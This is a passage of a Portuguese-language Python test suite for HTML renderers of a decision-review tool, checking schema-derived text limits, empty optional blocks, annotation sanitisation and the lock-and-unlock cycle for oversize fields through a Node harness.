    Fonte: `reviews/auditoria-cega-renderizadores.md` (auditoria cega do experimento A/B)."""

    # (marcação do textarea, schema do export, caminho do campo na definição)
    CAMPOS_DE_TEXTO_LIVRE = (
        ('id="comentario"', "decisao-direcoes-v1", ("comentario",)),
        ('id="annot-pop-text"', "decisao-direcoes-v1", ("anotacoes", [], "comentario")),
        ('id="ap-textarea"', "grill-respostas-v1", ("anotacoes", [], "comentario")),
        ('class="duvida-texto"', "grill-respostas-v1", ("respostas", [], "duvida_texto")),
        ('class="question-comment"', "grill-respostas-v1", ("respostas", [], "comentario")),
    )

    def _paginas(self):
        direcoes = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                              .read_text(encoding="utf-8"))
        grill = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                           .read_text(encoding="utf-8"))
        return render_direcoes(direcoes), render_grill(grill)

    @staticmethod
    def _textareas(pagina):
        return re.findall(r"<textarea\b[^>]*>", pagina)

    # ————— P1 (itens 1 e 2 da auditoria são a mesma classe: limite vindo do schema) —————

    def test_todo_textarea_tem_o_limite_que_o_schema_exige(self):
        paginas = self._paginas()
        achados = [t for pagina in paginas for t in self._textareas(pagina)]
        self.assertGreaterEqual(len(achados), 5, "faltou textarea nas páginas")
        for marca, schema, caminho in self.CAMPOS_DE_TEXTO_LIVRE:
            iguais = [t for t in achados if marca in t]
            self.assertTrue(iguais, f"não achei o campo {marca}")
            esperado = limite_de_texto(schema, *caminho)
            for tag in iguais:
                self.assertIn(f'maxlength="{esperado}"', tag,
                              f"{marca} aceita mais texto do que o schema permite: {tag}")

    def test_nenhum_textarea_escapa_do_gate_de_limite(self):
        """Textarea nova sem limite quebra aqui — é o gate que impede a classe de voltar."""
        marcas = [m for m, _, _ in self.CAMPOS_DE_TEXTO_LIVRE]
        for pagina in self._paginas():
            for tag in self._textareas(pagina):
                self.assertTrue(any(m in tag for m in marcas),
                                f"textarea fora do inventário de limites: {tag}")
                self.assertIn("maxlength=", tag, f"textarea sem limite: {tag}")

    def test_o_limite_acompanha_o_schema_e_nao_um_numero_escrito_a_mao(self):
        """Se o número estivesse repetido no template, mexer no schema não mudaria o HTML."""
        definicao = carregar_schema("decisao-direcoes-v1")
        original = json.loads(json.dumps(definicao))
        try:
            definicao["properties"]["comentario"]["maxLength"] = 1234
            pagina = render_direcoes(json.loads(
                (PASTA_DE_EXEMPLOS / "validos" / "direcoes.json").read_text(encoding="utf-8")))
        finally:
            _CACHE_DE_SCHEMAS["decisao-direcoes-v1"] = original
        tag = [t for t in self._textareas(pagina) if 'id="comentario"' in t][0]
        self.assertIn('maxlength="1234"', tag)

    def test_texto_no_limite_do_schema_ainda_produz_export_valido(self):
        limite = limite_de_texto("decisao-direcoes-v1", "comentario")
        exemplo = json.loads((PASTA_DE_EXEMPLOS / "validos" / "decisao-direcoes.json")
                             .read_text(encoding="utf-8"))
        exemplo["comentario"] = "a" * limite
        self.assertEqual(validar_contra_schema(exemplo, carregar_schema("decisao-direcoes-v1")), [])
        exemplo["comentario"] = "a" * (limite + 1)
        self.assertNotEqual(validar_contra_schema(exemplo, carregar_schema("decisao-direcoes-v1")), [],
                            "o schema precisa recusar o que passa do limite")

    # ————— P2 item 4: dado não declarado não nasce no documento (classe da decisão 19) —————

    def test_letra_ausente_nao_e_inventada_no_json_embutido(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        for direcao in base["direcoes"]:
            direcao.pop("letra", None)
        pagina = render_direcoes(base)
        abertura = '<script type="application/json" id="contrato-json">'
        inicio = pagina.index(abertura) + len(abertura)
        embutido = json.loads(pagina[inicio:pagina.index("</script>", inicio)]
                              .replace("<\\/", "</"))
        for direcao in embutido["direcoes"]:
            self.assertNotIn("letra", direcao,
                             "o motor gravou no documento uma letra que o contrato não deu")
        # ...e mesmo assim a página apresenta as letras, sem 'undefined' em lugar nenhum
        self.assertIn('<span class="letter-pill"><span data-origem-contrato>A</span></span>',
                      pagina)
        self.assertNotIn("undefined", re.sub(r"<script>.*?</script>", "", pagina, flags=re.S))

    # ————— P3 item 5: opcional ausente não deixa caixa vazia com rótulo —————

    def test_opcional_ausente_nao_deixa_estrutura_vazia(self):
        direcoes = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                              .read_text(encoding="utf-8"))
        for direcao in direcoes["direcoes"]:
            for campo in ("resumo", "origem_leiga", "custo_curto"):
                direcao.pop(campo, None)
            for campo in ("vs_recomendada", "prazo", "primeiro_passo"):
                direcao.get("consequencias", {}).pop(campo, None)
        pagina = render_direcoes(direcoes)
        self.assertEqual(re.findall(r"<span data-origem-contrato></span>", pagina), [],
                         "sobrou caixa do contrato sem nada dentro")
        self.assertNotIn("Comparado com o caminho recomendado", pagina,
                         "o rótulo da comparação ficou sozinho")
        self.assertNotIn("Prazo estimado", pagina)
        self.assertNotIn("Primeiro passo depois da escolha", pagina)
        for classe in ("row-resumo", "custo-curto", "dir-origin", "vs-note"):
            self.assertEqual(len(re.findall(f'class="{classe}"', pagina)), 0,
                             f"o bloco {classe} foi emitido sem conteúdo")

        grill = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                           .read_text(encoding="utf-8"))
        for pergunta in grill["perguntas"]:
            for campo in ("contexto", "origem"):
                pergunta.pop(campo, None)
        pagina = render_grill(grill)
        self.assertNotIn("Por que estou te perguntando", pagina,
                         "o rótulo ficou sozinho, sem o texto que ele anuncia")
        self.assertEqual(re.findall(r"::origem\">\s*</p>", pagina), [])

    def _maxima_direcoes(self):
        """Fixture com TODO opcional preenchido: sem isso a varredura muta o vazio."""
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        base.setdefault("prototipo", True)
        base.setdefault("aviso_prototipo", "PROTÓTIPO — dados de exemplo.")
        base.setdefault("versao_prototipo", "v1")
        criterios = [c.get("id") for c in base.get("criterios") or []]
        for i, direcao in enumerate(base["direcoes"]):
            direcao.setdefault("resumo", f"Resumo do caminho {i + 1}.")
            direcao.setdefault("origem_leiga", "Veio da pesquisa.")
            direcao.setdefault("custo_curto", "algumas horas")
            direcao.setdefault("letra", chr(ord("A") + i))
            # inclui os nomes que o schema prevê além dos critérios do exemplo
            direcao["pontuacao"] = {c: (i + 2) % 6 for c in criterios}
            for extra in ("complexidade", "robustez"):
                if extra in (carregar_schema("direcoes-v1")["properties"]["direcoes"]
                             ["items"]["properties"]["pontuacao"].get("properties") or {}):
                    direcao["pontuacao"][extra] = (i + 3) % 6
            consequencias = direcao.setdefault("consequencias", {})
            consequencias.setdefault("prazo", "duas semanas")
            consequencias.setdefault("primeiro_passo", "abrir a planilha")
            consequencias.setdefault("vs_recomendada", "Custa menos e entrega menos.")
        return base

    def _maxima_grill(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                          .read_text(encoding="utf-8"))
        base.setdefault("prototipo", True)
        base.setdefault("aviso_prototipo", "PROTÓTIPO — dados de exemplo.")
        base.setdefault("versao_prototipo", "v1")
        for pergunta in base["perguntas"]:
            pergunta.setdefault("contexto", "Contexto desta pergunta.")
            pergunta.setdefault("origem", "Veio do relatório de direções.")
            pergunta.setdefault("impacto_curto", "Muda o que será construído.")
            for opcao in pergunta["opcoes"]:
                opcao.setdefault("fora_da_caixa", False)
            pergunta["opcoes"][-1]["fora_da_caixa"] = True
        return base

    @staticmethod
    def _opcionais_do_schema(schema, caminho=()):
        """Todo campo que a definição NÃO exige — a lista sai do schema, não da memória."""
        if not isinstance(schema, dict):
            return
        exigidos = set(schema.get("required") or [])
        for campo, sub in (schema.get("properties") or {}).items():
            if campo not in exigidos:
                yield caminho + (campo,)
            yield from TestPosAuditoria._opcionais_do_schema(sub, caminho + (campo,))
        if schema.get("items"):
            yield from TestPosAuditoria._opcionais_do_schema(schema["items"],
                                                             caminho + ("[]",))

    @staticmethod
    def _remover_em(dado, caminho):
        """Remove o campo e DEVOLVE quantos removeu.

        Sem essa contagem, 21 das 53 iterações da varredura anterior mexiam num campo que
        já estava ausente da fixture: renderizavam a página intacta e chamavam aquilo de
        prova. Mutação sem efeito não é mutação."""
        if not caminho:
            return 0
        passo, resto = caminho[0], caminho[1:]
        if passo == "[]":
            if isinstance(dado, list):
                return sum(TestPosAuditoria._remover_em(item, resto) for item in dado)
            return 0
        if isinstance(dado, dict):
            if not resto:
                return 1 if dado.pop(passo, _AUSENTE) is not _AUSENTE else 0
            if passo in dado:
                return TestPosAuditoria._remover_em(dado[passo], resto)
        return 0

    @staticmethod
    def _restos_vazios(pagina):
        """Estrutura que sobrou sem nada dentro: caixa do contrato ou contêiner oco.

        Contêiner vazio COM id é slot que o JavaScript preenche; sem id, é estrutura que
        o motor emitiu à toa."""
        achados = []
        vazias = len(re.findall(r"<span data-origem-contrato>\s*</span>", pagina))
        if vazias:
            achados.append(f"span do contrato vazio x{vazias}")
        for atributos, _ in re.findall(r"<div([^>]*)>(\s*)</div>", pagina):
            # `id` = slot preenchido pelo JavaScript; `aria-hidden` = enfeite (gradiente
            # de rolagem, por exemplo), que existe justamente para não ter conteúdo
            if "id=" in atributos or 'aria-hidden="true"' in atributos:
                continue
            if "class=" in atributos:
                achados.append(f"<div{atributos.strip()}> vazio")
        return achados

    def test_toda_mutacao_de_opcional_tem_efeito_e_nao_deixa_resto(self):
        """A varredura sai do schema E cobra efeito: presenca no maximo, ausencia depois.

        A associacao caminho->bloco e a marcacao `data-opcional` no proprio HTML, nao uma
        lista de irmaos mantida a mao — que foi como `pontuacao` escapou duas vezes."""
        for nome, versao, render, maxima in (
                ("direcoes.json", "direcoes-v1", render_direcoes, self._maxima_direcoes()),
                ("grill-rodada.json", "grill-rodada-v1", render_grill, self._maxima_grill())):
            pagina_cheia = render(maxima)
            marcados = set(re.findall(r'data-opcional="([^"]+)"', pagina_cheia))
            self.assertTrue(marcados, f"{nome}: nenhum bloco condicional se declarou")
            efetivas = 0
            for caminho in self._opcionais_do_schema(carregar_schema(versao)):
                documento = json.loads(json.dumps(maxima))
                if not self._remover_em(documento, caminho):
                    continue                      # o campo nao existe na fixture maxima
                efetivas += 1
                try:
                    pagina = render(documento)
                except SystemExit:
                    continue                      # opcional que o gate recusa: outro teste
                self.assertEqual(self._restos_vazios(pagina), [],
                                 f"{nome} sem '{'.'.join(caminho)}': sobrou estrutura vazia")
                trilha = ".".join(str(p) for p in caminho)
                if trilha in marcados:
                    self.assertNotIn(f'data-opcional="{trilha}"', pagina,
                                     f"{nome}: o bloco de '{trilha}' ficou na pagina sem o "
                                     f"dado que ele anuncia")
            self.assertGreater(efetivas, 10,
                               f"{nome}: so {efetivas} mutacoes tiveram efeito — a fixture "
                               f"maxima nao cobre os opcionais")
            juntos = json.loads(json.dumps(maxima))
            for caminho in self._opcionais_do_schema(carregar_schema(versao)):
                self._remover_em(juntos, caminho)
            try:
                pagina = render(juntos)
            except SystemExit:
                continue
            self.assertEqual(self._restos_vazios(pagina), [],
                             f"{nome} sem nenhum opcional: sobrou estrutura vazia")
            self.assertEqual(re.findall(r'data-opcional="([^"]+)"', pagina), [],
                             f"{nome}: bloco condicional sobreviveu sem o seu dado")


    def test_opcional_presente_continua_aparecendo(self):
        """O contrapeso: omitir o vazio não pode omitir o cheio."""
        pagina = render_direcoes(json.loads(
            (PASTA_DE_EXEMPLOS / "validos" / "direcoes.json").read_text(encoding="utf-8")))
        for classe in ("row-resumo", "custo-curto", "dir-origin", "vs-note"):
            self.assertEqual(len(re.findall(f'class="{classe}"', pagina)), 3,
                             f"o bloco {classe} sumiu com conteúdo presente")
        self.assertIn("Comparado com o caminho recomendado", pagina)
        self.assertIn("Prazo estimado", pagina)
        grill = render_grill(json.loads(
            (PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json").read_text(encoding="utf-8")))
        self.assertEqual(grill.count("Por que estou te perguntando"), 2)

    def test_letra_declarada_pelo_contrato_e_respeitada(self):
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        self.assertEqual([d.get("letra") for d in base["direcoes"]], ["A", "B", "E"],
                         "a fixture precisa declarar uma letra fora da sequência")
        pagina = render_direcoes(base)
        # 'E' é a terceira direção: se o motor derivasse por posição, sairia 'C'
        self.assertIn('<span class="letter-pill"><span data-origem-contrato>E</span></span>',
                      pagina)
        self.assertNotIn('<span class="letter-pill"><span data-origem-contrato>C</span></span>',
                         pagina)


class TestPosAuditoriaNoNavegador(unittest.TestCase):
    """Os itens da auditoria que só o JavaScript real responde."""

    def _roda(self, pagina_html, corpo_js, funcoes, extra_argv=()):
        node = shutil.which("node")
        if not node:
            self.skipTest("Node não está instalado nesta máquina")
        with tempfile.TemporaryDirectory() as tmp:
            pagina = Path(tmp) / "pagina.html"
            pagina.write_text(pagina_html, encoding="utf-8")
            carregar = "\n".join(f'eval(corpoDaFuncao("{n}"));' for n in funcoes)
            script = """
            const fs = require("fs");
            const pagina = fs.readFileSync(process.argv[2], "utf8");
            function corpoDaFuncao(nome) {
              const inicio = pagina.indexOf("function " + nome + "(");
              if (inicio < 0) throw new Error("não achei a função " + nome);
              let nivel = 0;
              for (let j = pagina.indexOf("{", inicio); j < pagina.length; j++) {
                if (pagina[j] === "{") nivel++;
                else if (pagina[j] === "}" && --nivel === 0) return pagina.slice(inicio, j + 1);
              }
              throw new Error("função " + nome + " não fecha");
            }
            const inicioSem = pagina.indexOf("var SEM_CONTEUDO =");
            eval(pagina.slice(inicioSem, pagina.indexOf("})();", inicioSem) + 5));
            let contador = 0;
            function annotId() { return "gerado-" + (++contador); }
            __CARREGAR__
            __CORPO__
            """.replace("__CARREGAR__", carregar).replace("__CORPO__", corpo_js)
            arquivo = Path(tmp) / "harness.js"
            arquivo.write_text(script, encoding="utf-8")
            saida = subprocess.run([node, str(arquivo), str(pagina)] + list(extra_argv),
                                   capture_output=True, text=True)
            self.assertEqual(saida.returncode, 0, saida.stderr)
            return json.loads(saida.stdout)

    def _pagina_direcoes(self):
        return render_direcoes(json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                                          .read_text(encoding="utf-8")))

    def _pagina_grill(self):
        return render_grill(json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                                       .read_text(encoding="utf-8")))

    FUNCOES = ("temConteudo", "idInternoEstavel", "sanitizeAnnot", "sanitizarAnotacoes")

    def _roda_com_dom(self, pagina_html, corpo_js, extras=()):
        """Harness com DOM que PARSEIA e DESPACHA — não com setters e stubs.

        A rodada anterior provou o cálculo e não a página: `addEventListener` era no-op,
        `innerHTML` não era parseado e o teste chamava as funções por dentro. Com isso,
        um botão sem listener e um editor inexistente passaram como se funcionassem.
        Aqui o clique é `dispatchEvent` de verdade: fio solto, teste vermelho.

        Os apoios que restam são periféricos ao que se testa (rolagem, realce, desfazer);
        nada do caminho `aviso -> clique -> editor -> destrava` é simulado."""
        contrato = _contrato_embutido(pagina_html)
        e_direcoes = bool(contrato.get("direcoes"))
        if e_direcoes:
            preparo = """
            var state = { comentario: "", direcao_escolhida: null, dica_dispensada: true };
            var anotacoes = [{ id: "an-1", bloco_id: "recomendacao", trecho: "trecho vivo",
                               comentario: "", incompleta: false, resolucao: null,
                               ancora_status: "resolvida", criado_em: "2026-08-21T10:00:00" }];
            function schedulePersist() {} function persistNow() {}
            function syncAnnotUI() {} function gotoAnnot() {} function deleteAnnot() {}
            function blocoLabel() { return "Recomendacao"; }
            function openPanel() {}
            var comentario = document.getElementById("comentario");
            const CAMPO = comentario;
            const ANOTACAO = anotacoes[0];
            const CAMPOS = [
              { nome: "comentario", alvo: "comentario", limite: LIMITES_DE_TEXTO.comentario,
                set: function (v) { CAMPO.value = v; state.comentario = v; } },
              { nome: "anotacao", alvo: "an-1", limite: LIMITES_DE_TEXTO.anotacao,
                set: function (v) { ANOTACAO.comentario = v; } }
            ];
            function botoesDesabilitados() {
              return document.getElementById("btn-copy-json").disabled
                  && document.getElementById("btn-download-json").disabled;
            }
            """
        else:
            ids = [q["id"] for q in contrato["perguntas"]]
            preparo = """
            const IDS = __IDS__;
            var draft = { respostas: Object.create(null), ui: {}, anotacoes: [
              { id: "an-1", bloco_id: "b", trecho: "trecho vivo", comentario: "",
                incompleta: false, resolucao: null, ancora_status: "resolvida",
                criado_em: "2026-08-21T10:00:00" }] };
            IDS.forEach(function (q) {
              draft.respostas[q] = { estado: "aprovada", escolha_id: null,
                                     comentario: "", duvida_texto: "" };
            });
            var lastDeleted = null;
            function persist() {} function persistNow() {} function flush() {}
            function paintAll() {} function updateGlobal() {} function announce() {}
            function irParaAnotacao() {} function openPanel() {}
            var botoes = [{ disabled: false }, { disabled: false }];
            /* no grill o campo principal é o comentário da primeira pergunta, com o
               mesmo handler delegado que o template registra em `document` */
            const CAMPO = document.getElementById("comentario-" + IDS[0]);
            CAMPO.className = "question-comment";
            CAMPO.addEventListener("input", function () {
              draft.respostas[IDS[0]].comentario = CAMPO.value;
              atualizarTravas();
            });
            const ANOTACAO = draft.anotacoes[0];
            const CAMPOS = [{ nome: "anotacao", alvo: "an-1",
                              limite: LIMITES_DE_TEXTO.anotacao,
                              set: function (v) { ANOTACAO.comentario = v; } }];
            IDS.forEach(function (q) {
              CAMPOS.push({ nome: "comentario " + q, alvo: "comentario-" + q,
                limite: LIMITES_DE_TEXTO.comentario,
                set: function (v) { draft.respostas[q].comentario = v; } });
              CAMPOS.push({ nome: "duvida " + q, alvo: "duvida-" + q,
                limite: LIMITES_DE_TEXTO.duvida,
                set: function (v) { draft.respostas[q].duvida_texto = v; } });
            });
            function botoesDeEnvio() { return botoes; }
            function botoesDesabilitados() {
              return botoes.every(function (b) { return b.disabled; });
            }
            """.replace("__IDS__", json.dumps(ids))
        cabeca = """
        const { criarDom } = require(process.argv[3]);
        const dom = criarDom();
        global.document = dom.doc;
        function $(id) { return document.getElementById(id); }
        function escTexto(s) {
          return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;")
            .replace(/>/g, "&gt;").replace(/"/g, "&quot;");
        }
        function anotacoesPendentes() { return []; }
        function autogrow() {}
        function despachar(no, tipo) { return no.dispatchEvent(dom.evento(tipo)); }
        const linhaLimites = pagina.match(/var LIMITES_DE_TEXTO = \\{[^;]*\\};/)[0];
        eval(linhaLimites);
        """ + preparo + """
        const PAINEL = __PAINEL__;
        /* o registro do listener sai do PROPRIO template: se ele deixar de registrar,
           o harness deixa junto, e o ciclo quebra aqui — como tem de ser */
        const registro = pagina.match(/comentario\\.addEventListener\\("input"[^;]*;/);
        if (registro) eval(registro[0]);
        """.replace("__PAINEL__", "renderPanel" if e_direcoes else "rebuildPanel")
        funcoes = ("conferirLimite", "camposEstourados", "envioTravado",
                   "pintarCamposEstourados", "atualizarTravas", "irParaCampoEstourado",
                   "anotacaoPorId", "editarAnotacao", "abrirEdicaoDaAnotacao",
                   "el", "aoDigitarNoCampoPrincipal", "elemPorDado",
                   "renderPanel" if e_direcoes else "rebuildPanel") + tuple(extras)
        return self._roda(pagina_html, cabeca + corpo_js, funcoes,
                          extra_argv=[str(caminho_do_minidom())])


    # ————— P1 item 2: IDs restaurados normalizados também nas direções —————

    def test_ids_hostis_restaurados_nas_direcoes_saem_validos(self):
        corpo = """
        const bloco = CONTRATO.direcoes ? "dir-" + CONTRATO.direcoes[0].id + "-explicacao" : "b";
        const saida = sanitizarAnotacoes([
          { id: "dup", bloco_id: bloco, trecho: "t", comentario: "primeiro" },
          { id: "dup", bloco_id: bloco, trecho: "t", comentario: "segundo" },
          { id: "nul" + String.fromCharCode(0), bloco_id: bloco, trecho: "t",
            comentario: "com NUL" },
          { id: "cr\\rquebra", bloco_id: bloco, trecho: "t", comentario: "com CR" }
        ]);
        console.log(JSON.stringify({ ids: saida.map(a => a.id),
                                     comentarios: saida.map(a => a.comentario) }));
        """
        pagina = self._pagina_direcoes()
        abertura = '<script type="application/json" id="contrato-json">';
        inicio = pagina.index(abertura) + len(abertura)
        contrato = pagina[inicio:pagina.index("</script>", inicio)].replace("<\\/", "</")
        resultado = self._roda(pagina, "const CONTRATO = " + contrato + ";\n" + corpo,
                               self.FUNCOES)
        ids = resultado["ids"]
        self.assertEqual(len(ids), 4, "nenhuma anotação podia ser descartada")
        self.assertEqual(len(set(ids)), 4, f"ids repetidos sobreviveram: {ids}")
        for identificador in ids:
            self.assertNotIn("\x00", identificador)
            self.assertNotIn("\r", identificador)
        # e o motor precisa aceitar o export que sai daí
        exemplo = json.loads((PASTA_DE_EXEMPLOS / "validos" / "decisao-direcoes.json")
                             .read_text(encoding="utf-8"))
        exemplo["anotacoes"] = [
            {"id": i, "bloco_id": "recomendacao", "ancora_status": "resolvida",
             "trecho": "t", "comentario": c}
            for i, c in zip(ids, resultado["comentarios"])]
        self.assertEqual(validar_contra_schema(exemplo, carregar_schema("decisao-direcoes-v1")), [])
        self.assertEqual(regras_extras(exemplo), [])

    # ————— P2 item 3: anotação sem comentário é marcador, não lixo —————

    def test_anotacao_so_com_ancora_sobrevive_ao_reload(self):
        corpo = """
        const a = sanitizeAnnot({ id: "so-marcador", bloco_id: "recomendacao",
                                  trecho: "um trecho de verdade", comentario: "" });
        console.log(JSON.stringify({ sobreviveu: a !== null,
                                     comentario: a && a.comentario,
                                     incompleta: a && a.incompleta,
                                     trecho: a && a.trecho }));
        """
        for pagina in (self._pagina_direcoes(), self._pagina_grill()):
            resultado = self._roda(pagina, corpo, self.FUNCOES)
            self.assertTrue(resultado["sobreviveu"],
                            "a UI promete que o marcador vale sozinho, e o reload o apagou")
            self.assertEqual(resultado["comentario"], "")
            self.assertEqual(resultado["trecho"], "um trecho de verdade")
            self.assertFalse(resultado["incompleta"],
                             "marcador com âncora inteira não é anotação incompleta")

    # ————— P1 da r1: rascunho restaurado contorna o maxlength —————

    def test_ciclo_completo_pelo_clique_no_aviso(self):
        """estourar → avisar → CLICAR "Encurtar" → editar → destravar → exportar válido.

        Tudo por evento despachado. Na rodada anterior o botão do aviso não tinha
        listener e o editor da anotação não existia; o teste passava porque chamava as
        funções por dentro. Se o fio voltar a soltar, isto fica vermelho."""
        corpo = """
        const passos = {};
        function foto(nome) {
          passos[nome] = { travado: envioTravado(), botoes: botoesDesabilitados(),
                           aviso: !$("campos-estourados").hidden };
        }
        foto("inicio");

        // ——— origem 1: campo digitado, pelo evento de input do próprio template
        const grande = "a".repeat(LIMITES_DE_TEXTO.comentario + 1);
        CAMPO.value = grande;
        despachar(CAMPO, "input");
        foto("campo estourado");
        const botoesAviso = $("campos-estourados").querySelectorAll("[data-encurtar]");
        passos.avisoTemBotao = botoesAviso.length;
        despachar(botoesAviso[0], "click");                 // clique de verdade
        passos.cliqueLevouAoCampo = !!CAMPO.focado;
        CAMPO.value = grande.slice(0, LIMITES_DE_TEXTO.comentario);
        despachar(CAMPO, "input");
        foto("campo encurtado");

        // ——— origem 2: anotação restaurada, estourada, sem passar por setter
        ANOTACAO.comentario = "b".repeat(LIMITES_DE_TEXTO.anotacao + 1);
        atualizarTravas();
        foto("anotacao estourada");
        const botaoAnotacao = $("campos-estourados").querySelectorAll("[data-encurtar]")[0];
        despachar(botaoAnotacao, "click");                  // abre a edição
        PAINEL();                                           // painel real desenha o card
        const editor = $("ap-body").querySelector("[data-editar-anotacao]");
        passos.editorExiste = !!editor;
        if (editor) {
          passos.editorEhCampo = editor.tagName;      // div não se edita
          passos.editorTemLimite = editor.getAttribute("maxlength");
          passos.editorTrazOTexto = editor.value.length;
          editor.value = "b".repeat(LIMITES_DE_TEXTO.anotacao);
          despachar(editor, "input");                       // digita no editor de verdade
        }
        foto("anotacao encurtada");
        passos.comentarioFinal = ANOTACAO.comentario.length;
        passos.campoFinal = CAMPO.value.length;
        console.log(JSON.stringify(passos));
        """
        for nome, pagina in (("direções", self._pagina_direcoes()),
                             ("grill", self._pagina_grill())):
            with self.subTest(nome):
                r = self._roda_com_dom(pagina, corpo)
                self.assertFalse(r["inicio"]["travado"])
                self.assertTrue(r["campo estourado"]["travado"], "estourou e não travou")
                self.assertTrue(r["campo estourado"]["botoes"], "botão seguiu clicável")
                self.assertTrue(r["campo estourado"]["aviso"], "estourou sem avisar")
                self.assertGreaterEqual(r["avisoTemBotao"], 1, "o aviso não trouxe botão")
                self.assertTrue(r["cliqueLevouAoCampo"],
                                "clicar em 'Encurtar' não levou a lugar nenhum — o botão "
                                "existe mas não tem listener")
                self.assertFalse(r["campo encurtado"]["travado"], "encurtou e seguiu travado")
                self.assertFalse(r["campo encurtado"]["botoes"], "botão seguiu desabilitado")
                self.assertFalse(r["campo encurtado"]["aviso"], "o aviso não sumiu")

                self.assertTrue(r["anotacao estourada"]["travado"])
                self.assertTrue(r["editorExiste"],
                                "a anotação restaurada não tem editor: encurtar só seria "
                                "possível apagando a anotação inteira")
                self.assertEqual(r["editorEhCampo"], "TEXTAREA",
                                 "o 'editor' é um bloco de texto, não um campo — não dá "
                                 "para digitar nele")
                self.assertEqual(r["editorTemLimite"],
                                 str(limite_de_texto("decisao-direcoes-v1",
                                                     "anotacoes", [], "comentario")))
                self.assertGreater(r["editorTrazOTexto"], 0,
                                   "o editor abriu vazio — o texto do usuário sumiu")
                self.assertFalse(r["anotacao encurtada"]["travado"],
                                 "editou a anotação para caber e continuou travado")
                self.assertFalse(r["anotacao encurtada"]["botoes"])

    def test_o_que_a_pagina_deixa_enviar_o_motor_aceita(self):
        """O outro lado do ciclo: no limite exato, os dois exports validam no motor."""
        for versao, exemplo in (("decisao-direcoes-v1", "decisao-direcoes.json"),
                                ("grill-respostas-v1", "grill-respostas.json")):
            dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo)
                              .read_text(encoding="utf-8"))
            molde = (dado["anotacoes"] or [{"id": "an-1", "bloco_id": "b",
                                            "ancora_status": "resolvida", "trecho": "t"}])[0]
            dado["anotacoes"] = [dict(molde,
                                      comentario="a" * limite_de_texto(versao, "anotacoes",
                                                                       [], "comentario"))]
            if versao == "decisao-direcoes-v1":
                dado["comentario"] = "b" * limite_de_texto(versao, "comentario")
            else:
                for resposta in dado["respostas"]:
                    resposta["comentario"] = "b" * limite_de_texto(versao, "respostas", [],
                                                                   "comentario")
                    resposta["duvida_texto"] = "c" * limite_de_texto(versao, "respostas", [],
                                                                     "duvida_texto")
            self.assertEqual(validar_contra_schema(dado, carregar_schema(versao)), [],
                             f"{exemplo}: no limite exato o motor recusou")

    def test_os_sete_campos_travam_e_destravam(self):
        """Cobertura dos 7 campos das duas páginas, cada um com ida e volta.

        O ciclo por clique está no teste acima; aqui o que se cobra é que NENHUM campo de
        texto livre fique de fora da conta — inclusive os que só existem por pergunta."""
        corpo = """
        const resultado = [];
        CAMPOS.forEach(function (campo) {
          const limite = campo.limite;
          campo.set("x".repeat(limite + 1));
          atualizarTravas();
          const apontado = camposEstourados().some(function (c) {
            return c.alvo && c.alvo.id === campo.alvo;
          });
          const travado = envioTravado() && botoesDesabilitados();
          campo.set("x".repeat(limite));
          atualizarTravas();
          const destravado = !envioTravado() && !botoesDesabilitados();
          campo.set("");
          atualizarTravas();
          resultado.push({ nome: campo.nome, limite: limite, travado: travado,
                           apontado: apontado, destravado: destravado });
        });
        console.log(JSON.stringify(resultado));
        """
        total = 0
        for nome, pagina in (("direções", self._pagina_direcoes()),
                             ("grill", self._pagina_grill())):
            campos = self._roda_com_dom(pagina, corpo)
            total += len(campos)
            for campo in campos:
                with self.subTest(f"{nome}/{campo['nome']}"):
                    self.assertTrue(campo["travado"], "passou do limite e não travou")
                    self.assertTrue(campo["apontado"], "travou sem dizer qual campo foi")
                    self.assertTrue(campo["destravado"], "voltou ao limite e seguiu travado")
        self.assertEqual(total, 7, f"a varredura cobriu {total} campos, e são 7")

    def test_texto_no_limite_exportado_passa_no_motor(self):
        """O contrapeso: o que a página deixa enviar tem de valer no motor."""
        limite = limite_de_texto("decisao-direcoes-v1", "comentario")
        exemplo = json.loads((PASTA_DE_EXEMPLOS / "validos" / "decisao-direcoes.json")
                             .read_text(encoding="utf-8"))
        exemplo["comentario"] = "a" * limite
        exemplo["anotacoes"][0]["comentario"] = "a" * limite
        self.assertEqual(validar_contra_schema(
            exemplo, carregar_schema("decisao-direcoes-v1")), [])

    def test_anotacao_sem_nada_humano_continua_sendo_descartada(self):
        corpo = """
        const vazia = sanitizeAnnot({ id: "nada", comentario: "", trecho: "", bloco_id: "" });
        const invisivel = sanitizeAnnot({ id: "i", comentario: "\\u200b", trecho: "\\u200b",
                                          bloco_id: "" });
        console.log(JSON.stringify({ vazia: vazia === null, invisivel: invisivel === null }));
        """
        for pagina in (self._pagina_direcoes(), self._pagina_grill()):
            resultado = self._roda(pagina, corpo, self.FUNCOES)
            self.assertTrue(resultado["vazia"], "anotação sem nada humano virou registro")
            self.assertTrue(resultado["invisivel"], "só invisível não é conteúdo")


class TestImportarReconciliacao(TestImportar):
    """Task 7 r2: o disco é reconciliado inteiro antes de aceitar qualquer resposta.

    A régua é a mesma dos outros gates do motor — qualquer dúvida bloqueia. Aqui a dúvida
    mora nos vínculos: identificador que a resposta cita e não existe na origem, artefato
    órfão, contrato de outra tarefa, duas rodadas abertas ao mesmo tempo."""

    def _abre_rodada(self, rodada=1):
        return self._grava(f"contratos/04-grill-rodada-{rodada}.json", "grill-rodada.json",
                           {"rodada": rodada})

    # ————— P1-1: presença do identificador não é resposta —————

    def test_resposta_ainda_pendente_no_grill_e_recusada(self):
        self._abre_rodada()
        dado = self._dado("grill-respostas.json", {"rodada": 1})
        dado["respostas"][0].update({"estado": "pendente", "escolha_id": None})
        arquivo = self.raiz / "pend.json"
